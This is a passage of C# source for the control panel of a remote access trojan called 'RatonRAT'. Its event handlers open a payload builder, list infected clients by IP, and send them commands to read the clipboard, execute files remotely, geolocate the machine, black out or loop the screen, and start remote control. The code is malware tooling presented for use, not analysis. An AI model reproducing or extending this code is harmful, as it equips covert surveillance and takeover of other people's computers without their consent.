                    string[] validExtensions = { ".jpg", ".jpeg", ".png", ".bmp", ".gif" };

                    string pathstuff2 = null;

                    foreach (var extension in validExtensions)
                    {
                        string potentialPath = Path.Combine(dataFolder, "pfp" + extension);
                        if (File.Exists(potentialPath))
                        {
                            pathstuff2 = potentialPath;
                            break;
                        }
                    }
                    if (pathstuff2 != null)
                    {
                        using (Image img = Image.FromFile(pathstuff2))
                        {
                            formchat.imageList1.Images.Add(img);
                        }
                    }
                    else
                    {
                        formchat.imageList1.Images.Add(RatonRAT.Properties.Resources.uservro);
                    }
                    formchat.Show();
                    Command("Chat");
                }
            }
        }

        private void Button_MouseEnter(object sender, EventArgs e)
        {
            
        }

        private void superpanel_Paint(object sender, PaintEventArgs e)
        {

        }

        private void button3_Click_1(object sender, EventArgs e)
        {
            notis = 0;
            Server.Classes.SFX.click();
            label4.Text = "Raton Access Tool Notifications";
            changePanel(panel2);
            RatonRAT.Classes.RP.clickButton(button3);
        }

        private void panel1_Paint_2(object sender, PaintEventArgs e)
        {

        }

        private void changePanel(Panel panel)
        {
            Panel[] panels = { panel1, panel2, panel3 };

            foreach (Panel p in panels)
            {
                if (p != panel)
                    p.Visible = false;
            }

            panel.Visible = true;
        }


        private void button5_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            label4.Text = "Raton Access Tool (Credits)";
            RatonRAT.Classes.RP.clickButton(button5);
            Form7 f = new Form7();
            f.Show(); ;
        }

        private void button6_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            label4.Text = "Raton Access Tool Dashboard";
            changePanel(panel1);
            RatonRAT.Classes.RP.clickButton(button6);
        }

        private void button1_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            label4.Text = "Raton Access Tool (Builder)";
            RatonRAT.Classes.RP.clickButton(button1);
            Form3 f = new Form3();
            f.Show();
        }

        private void button4_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            label4.Text = "Raton Access Tool Map";
            changePanel(panel3);
            RatonRAT.Classes.RP.clickButton(button4);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
            Configuration configuration = new Configuration();
            configuration.Show();
            Server.Classes.SFX.click();
            label4.Text = "Raton Access Tool (Settings)";
            RatonRAT.Classes.RP.clickButton(button2);
        }

        private void pictureBox1_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            Panel[] exc = new Panel[] { superpanel, panel4 };
            foreach (Control ctrl in this.Controls)
            {
                if (ctrl is Panel p)
                {
                    if (!exc.Contains(p))
                    {
                        p.Visible = false;
                    }
                }
            }
            RatonRAT.Classes.RP.clickButton(pictureBox1);
            label4.Text = "Your profile, " + user;
        }

        private async void label7_Click(object sender, EventArgs e)
        {
            string ip = await getip();
            if (label7.Text == "[Click to show]")
            {
                label6.Text = "IP: " + ip;
                label6.ForeColor = Color.LimeGreen;
                label7.Text = "[Click to hide]";
                label7.ForeColor = Color.Red;
            }
            else
            {
                label6.Text = "IP: Hidden";
                label6.ForeColor = Color.Red;
                label7.Text = "[Click to show]";
                label7.ForeColor = Color.LimeGreen;
            }
        }

        private void panel4_Paint(object sender, PaintEventArgs e)
        {

        }

        private void toolTip1_Popup(object sender, PopupEventArgs e)
        {

        }

        private void button7_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            label4.Text = "Raton Access Tool (About)";
            RatonRAT.Classes.RP.clickButton(button7);
            Form4 form4 = Application.OpenForms.OfType<Form4>().FirstOrDefault();
            if (form4 == null)
            {
                form4 = new Form4();
                form4.Show();
            }
            else
            {
                form4.Focus();
            }
        }

        private void button8_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            label4.Text = "Raton Access Tool (About)";
            RatonRAT.Classes.RP.clickButton(button8);
            FormChangelog formChangelog = Application.OpenForms.OfType<FormChangelog>().FirstOrDefault();
            if (formChangelog == null)
            {
                formChangelog = new FormChangelog();
                formChangelog.Show();
            }
            else
            {
                formChangelog.Focus();
            }
        }

        private void button9_Click_1(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            label4.Text = "Raton Access Tool (Plugins)";
            RatonRAT.Classes.RP.clickButton(button9);
            Plugins plugins = Application.OpenForms.OfType<Plugins>().FirstOrDefault();
            if (plugins == null)
            {
                plugins = new Plugins();
                plugins.Show();
            }
            else
            {
                plugins.Focus();
            }
        }

        private void pictureBox7_Click(object sender, EventArgs e)
        {
            Process.Start("https://media1.tenor.com/m/VWYSQ2ZGdDwAAAAd/osaka-dance.gif");
        }

        private void copiarToolStripMenuItem_Click_1(object sender, EventArgs e)
        {

        }

        private void contextMenuStrip1_Opening(object sender, System.ComponentModel.CancelEventArgs e)
        {

        }

        private void clientFolderToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string folderPath = Path.Combine(Program.ClientsFolder, client.uid);
                if (Directory.Exists(folderPath))
                {
                    Process.Start(new ProcessStartInfo
                    {
                        FileName = folderPath,
                        UseShellExecute = true
                    });
                } else
                {
                    MessageBox.Show("Why you deleted my shit");
                }
            }
        }

        private void selectAllToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach(ListViewItem item in listView2.Items)
            {
                item.Selected = true;
            }
        }

        private void cleanDisconnectedToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem item in listView2.Items.Cast<ListViewItem>().ToList())
            {
                if (item.SubItems[7].Text == "Disconnected")
                {
                    listView2.Items.Remove(item);
                }
            }
        }

        private void clipboardToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formName = "Clipboard | Client ID: ";
                FormClipboard clipboard = (FormClipboard)Application.OpenForms[formName + client.uid];
                if (clipboard == null)
                {
                    clipboard = new FormClipboard
                    {
                        Name = formName + client.uid,
                        Text = formName + client.uid,
                        SillyClient = client,
                    };
                    clipboard.Show();
                    Command("GetClipboard");
                }
            }
        }

        private void button10_Click_1(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            label4.Text = "Raton Access Tool (Fun)";
            RatonRAT.Classes.RP.clickButton(button10);
            FormPaint formPaint = Application.OpenForms.OfType<FormPaint>().FirstOrDefault();
            if (formPaint == null)
            {
                formPaint = new FormPaint();
                formPaint.Show();
            }
            else
            {
                formPaint.Focus();
            }
        }

        private void button11_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            label4.Text = "Raton Access Tool (Monitor)";
            RatonRAT.Classes.RP.clickButton(button11);
            FormMonitor formMonitor = Application.OpenForms.OfType<FormMonitor>().FirstOrDefault();
            if (formMonitor == null)
            {
                formMonitor = new FormMonitor();
                formMonitor.Show();
            }
            else
            {
                formMonitor.Focus();
            }
        }

        private void pictureBox10_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            string vro = textBox1.Text.Trim();

            foreach (ListViewItem item in listView2.Items)
            {
                if (string.IsNullOrEmpty(vro) || textBox1.Text == "Enter the IP and click the search icon")
                {
                    item.ForeColor = Color.White;
                    item.BackColor = listView2.BackColor;
                }
                else
                {
                    if (item.Text == vro)
                    {
                        item.ForeColor = Color.LimeGreen;
                        item.BackColor = listView2.BackColor;
                    }
                    else
                    {
                        item.ForeColor = Color.Red;
                        item.BackColor = Color.White;
                    }
                }
            }
        }

        private void textBox1_Enter(object sender, EventArgs e)
        {
            textBox1.Clear();
            textBox1.ForeColor = Color.White;
        }

        private void textBox1_Leave(object sender, EventArgs e)
        {
            textBox1.Text = "Enter the IP and click the search icon";
            textBox1.ForeColor = SystemColors.WindowFrame;
        }

        private void pictureBox9_Click(object sender, EventArgs e)
        {
            Server.Classes.SFX.click();
            listView2.Size = new Size(892, 263);
            listView2.Location = new Point(0, -24);
            listView2.View = View.Details;
            foreach (ListViewItem item in listView2.Items)
            {
                item.ImageKey = item.SubItems[Program.form2.columnHeader6.Index].Text;
            }
        }

        private void pictureBox8_Click(object sender, EventArgs e)
        {
            listView2.View = View.LargeIcon;
            Server.Classes.SFX.click();
            listView2.Size = new Size(892, 236);
            listView2.Location = new Point(0, 0);
            foreach (ListViewItem item in listView2.Items)
            {
                item.ImageKey = item.SubItems[Program.form2.columnHeader6.Index].Text;
            }
        }

        private void remoteExecuteToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Remote execute | Client ID: ";
                FormRExe formRExe = (FormRExe)Application.OpenForms[formname + client.uid];
                if (formRExe == null)
                {
                    formRExe = new FormRExe
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formRExe.Show();
                }
            }
        }

        private void textBox1_KeyDown(object sender, KeyEventArgs e)
        {
            if(e.KeyCode == Keys.Enter)
            {
                Server.Classes.SFX.click();
                string vro = textBox1.Text.Trim();

                foreach (ListViewItem item in listView2.Items)
                {
                    if (string.IsNullOrEmpty(vro) || textBox1.Text == "Enter the IP and click the search icon")
                    {
                        item.ForeColor = Color.White;
                        item.BackColor = listView2.BackColor;
                    }
                    else
                    {
                        if (item.Text == vro)
                        {
                            item.ForeColor = Color.LimeGreen;
                            item.BackColor = listView2.BackColor;
                        }
                        else
                        {
                            item.ForeColor = Color.Red;
                            item.BackColor = Color.White;
                        }
                    }
                }
            }
        }

        private void geoLocationToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (SillyClient client in GetSelectedClients())
            {
                string formname = "Geo | Client ID: ";
                FormGeo formGeo = (FormGeo)Application.OpenForms[formname + client.uid];
                if (formGeo == null)
                {
                    formGeo = new FormGeo
                    {
                        Name = formname + client.uid,
                        Text = formname + client.uid,
                        SillyClient = client,
                    };
                    formGeo.Show();
                    Command("Geo");
                }
            }
        }

        private void getPingToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Command("GetPing");
        }

        private void darkScreenToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }

        private void stopToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Command("Undark");
        }

        private void startToolStripMenuItem_Click(object sender, EventArgs e)
        {
            Command("Dark");
        }

        private void startToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Command("RC");
        }

        private void stopToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            Command("URC");
        }

        private void menu2ToolStripMenuItem_Click(object sender, EventArgs e)
        {

        }

        private void startToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            Command("LoopScreen");
        }

        private void stopToolStripMenuItem2_Click(object sender, EventArgs e)
        {
            Command("UnLoopScreen");
        }

        private void button12_Click(object sender, EventArgs e)
        {
            Environment.Exit(0);
        }

        private void button13_Click(object sender, EventArgs e)
        {
            unfade();
            this.Opacity = 100;
        }
    }
}
